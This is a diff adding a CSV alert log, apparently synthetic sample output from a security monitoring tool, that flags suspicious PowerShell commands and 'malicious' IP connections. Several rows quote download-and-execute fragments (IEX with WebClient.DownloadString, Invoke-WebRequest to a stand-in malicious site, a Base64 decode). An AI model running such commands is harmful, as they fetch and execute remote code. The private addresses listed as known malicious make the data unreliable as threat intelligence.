@@ -1,0 +1,10 @@
+timestamp,type,details,severity
+2025-08-06 15:36:26,SUSPICIOUS POWERSHELL COMMAND,Potentially malicious command detected: Invoke-WebRequest -Uri http://malicious-site.com,MEDIUM
+2025-08-06 15:36:53,SUSPICIOUS POWERSHELL COMMAND,Potentially malicious command detected: IEX (New-Object System.Net.WebClient).DownloadString(),MEDIUM
+2025-08-06 15:37:03,MALICIOUS IP DETECTED,Connection from known malicious IP: 192.168.1.100,HIGH
+2025-08-06 15:37:26,SUSPICIOUS POWERSHELL COMMAND,Potentially malicious command detected: IEX (New-Object System.Net.WebClient).DownloadString(),MEDIUM
+2025-08-06 15:37:33,MALICIOUS IP DETECTED,Connection from known malicious IP: 10.0.0.50,HIGH
+2025-08-06 15:37:45,MALICIOUS IP DETECTED,Connection from known malicious IP: 10.0.0.50,HIGH
+2025-08-06 15:37:53,SUSPICIOUS POWERSHELL COMMAND,"Potentially malicious command detected: [Convert]::FromBase64String(""bWFsaWNpb3VzIGNvZGU="")",MEDIUM
+2025-08-06 15:38:02,SUSPICIOUS POWERSHELL COMMAND,Potentially malicious command detected: Invoke-WebRequest -Uri http://malicious-site.com,MEDIUM
+2025-08-06 15:38:23,SUSPICIOUS POWERSHELL COMMAND,Potentially malicious command detected: IEX (New-Object System.Net.WebClient).DownloadString(),MEDIUM
